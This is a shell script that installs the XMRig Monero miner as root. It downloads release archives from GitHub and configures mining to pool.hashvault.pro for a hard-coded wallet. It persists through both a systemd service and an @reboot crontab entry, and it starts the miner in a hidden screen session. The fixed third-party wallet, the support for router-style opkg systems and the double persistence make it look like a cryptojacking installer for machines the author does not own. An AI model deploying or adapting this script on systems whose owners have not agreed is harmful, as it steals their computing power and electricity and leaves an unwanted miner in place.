#!/bin/sh
# Universal XMRig Installer for Linux with Screen support
echo "[+] Installing XMRig Miner..."

# Detect package manager and install basic tools + screen
if command -v apt >/dev/null 2>&1; then
    echo "[+] Using apt package manager"
    apt update
    apt install -y curl wget tar screen
elif command -v yum >/dev/null 2>&1; then
    echo "[+] Using yum package manager" 
    yum install -y curl wget tar screen
elif command -v opkg >/dev/null 2>&1; then
    echo "[+] Using opkg package manager"
    opkg update
    opkg install curl wget tar screen
else
    echo "[+] No package manager found, trying to continue with available tools"
    # Попробуем установить screen вручную если есть wget/curl
    if command -v wget >/dev/null 2>&1; then
        echo "[+] Attempting to install screen manually"
        wget http://ftp.debian.org/debian/pool/main/s/screen/screen_4.9.0-4_amd64.deb
        dpkg -i screen_4.9.0-4_amd64.deb || true
    fi
fi

# Create miner directory
echo "[+] Creating miner directory..."
mkdir -p /root/xmrig_miner
cd /root/xmrig_miner

# Detect architecture and download correct version
ARCH=$(uname -m)
echo "[+] Detected architecture: $ARCH"

# Universal Linux download URL (static build works on most systems)
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz"

# For ARM devices
case $ARCH in
    "aarch64"|"arm64")
        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-arm64.tar.gz"
        ;;
    "armv7l"|"armhf")
        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-armhf.tar.gz"
        ;;
    "i386"|"i686")
        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x86.tar.gz"
        ;;
esac

echo "[+] Downloading XMRig from: $XMRIG_URL"

# Download with curl or wget
if command -v curl >/dev/null 2>&1; then
    curl -L -o xmrig.tar.gz "$XMRIG_URL"
elif command -v wget >/dev/null 2>&1; then
    wget -O xmrig.tar.gz "$XMRIG_URL"
else
    echo "[-] Error: curl or wget not found!"
    exit 1
fi

# Check if download succeeded
if [ ! -f "xmrig.tar.gz" ]; then
    echo "[-] Download failed! Trying alternative URL..."
    
    # Alternative download URL
    XMRIG_ALT_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz"
    
    if command -v curl >/dev/null 2>&1; then
        curl -L -o xmrig.tar.gz "$XMRIG_ALT_URL"
    elif command -v wget >/dev/null 2>&1; then
        wget -O xmrig.tar.gz "$XMRIG_ALT_URL"
    fi
fi

if [ ! -f "xmrig.tar.gz" ]; then
    echo "[-] Critical: Could not download XMRig!"
    exit 1
fi

echo "[+] Extracting XMRig..."
tar -xzf xmrig.tar.gz --strip-components=1

# Find and make binary executable
if [ -f "xmrig" ]; then
    chmod +x xmrig
else
    # Look for binary in subdirectories
    found_binary=$(find . -name "xmrig" -type f | head -1)
    if [ -n "$found_binary" ]; then
        cp "$found_binary" .
        chmod +x xmrig
    else
        echo "[-] Error: xmrig binary not found in archive!"
        exit 1
    fi
fi

# Create simple config
echo "[+] Creating config file..."
cat > config.json << 'END_CONFIG'
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": "monero",
            "algo": "rx/0",
            "url": "pool.hashvault.pro:443",
            "user": "87N1Fb1gkypZgnPB4ysPXj3L1J8YR7EK2JpLJX9w6yDpVs7FXUJH7zc996sbnhJ3sU51MrBzTPLMJW8JCmJehNci9E8Jw5N",
            "pass": "x",
            "tls": true,
            "keepalive": true
        }
    ],
    "api": {
        "port": 0,
        "restricted": true
    },
    "background": false,
    "print-time": 60
}
END_CONFIG

# Create startup script with screen
echo "[+] Creating startup script with screen..."
cat > start_miner.sh << 'END_SCRIPT'
#!/bin/sh
cd /root/xmrig_miner
echo "[+] Starting XMRig miner in screen session..."
if command -v screen >/dev/null 2>&1; then
    screen -dmS xmrig-miner ./xmrig -c config.json
    echo "[+] Screen session started: xmrig-miner"
    echo "[+] To attach: screen -r xmrig-miner"
    echo "[+] To detach: Ctrl+A then D"
else
    echo "[!] Screen not found, running in foreground..."
    ./xmrig -c config.json
fi
END_SCRIPT

chmod +x start_miner.sh

# Create management scripts
cat > /usr/local/bin/xmrig-start << 'END_SCRIPT'
#!/bin/sh
/root/xmrig_miner/start_miner.sh
END_SCRIPT

cat > /usr/local/bin/xmrig-attach << 'END_SCRIPT'
#!/bin/sh
screen -r xmrig-miner
END_SCRIPT

cat > /usr/local/bin/xmrig-stop << 'END_SCRIPT'
#!/bin/sh
pkill -f xmrig
screen -S xmrig-miner -X quit 2>/dev/null
echo "[+] XMRig miner stopped"
END_SCRIPT

chmod +x /usr/local/bin/xmrig-start
chmod +x /usr/local/bin/xmrig-attach
chmod +x /usr/local/bin/xmrig-stop

# Add to autostart (systemd)
if command -v systemctl >/dev/null 2>&1; then
    echo "[+] Creating systemd service..."
    cat > /etc/systemd/system/xmrig.service << 'END_SERVICE'
[Unit]
Description=XMRig Miner Service
After=network.target

[Service]
Type=forking
User=root
WorkingDirectory=/root/xmrig_miner
ExecStart=/root/xmrig_miner/start_miner.sh
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
END_SERVICE

    systemctl daemon-reload
    systemctl enable xmrig.service
    systemctl start xmrig.service
    echo "[+] Systemd service created and enabled"
fi

# Add to autostart (crontab)
echo "[+] Adding to crontab for autostart..."
(crontab -l 2>/dev/null; echo "@reboot /root/xmrig_miner/start_miner.sh") | crontab -

echo "[+] Installation complete!"
echo "[+] ========================================="
echo "[+] XMRig Miner successfully installed!"
echo "[+] ========================================="
echo "[+] Wallet: 87N1Fb1gkypZgnPB4ysPXj3L1J8YR7EK2JpLJX9w6yDpVs7FXUJH7zc996sbnhJ3sU51MrBzTPLMJW8JCmJehNci9E8Jw5N"
echo "[+] Pool: pool.hashvault.pro:443"
echo "[+] "
echo "[+] Management commands:"
echo "[+]   xmrig-start    - Start miner in screen"
echo "[+]   xmrig-attach   - Attach to screen session"
echo "[+]   xmrig-stop     - Stop miner"
echo "[+] "
echo "[+] Autostart: Enabled (systemd + crontab)"
echo "[+] Screen: Enabled"
echo "[+] ========================================="

# Start miner automatically
echo "[+] Starting miner..."
/root/xmrig_miner/start_miner.sh
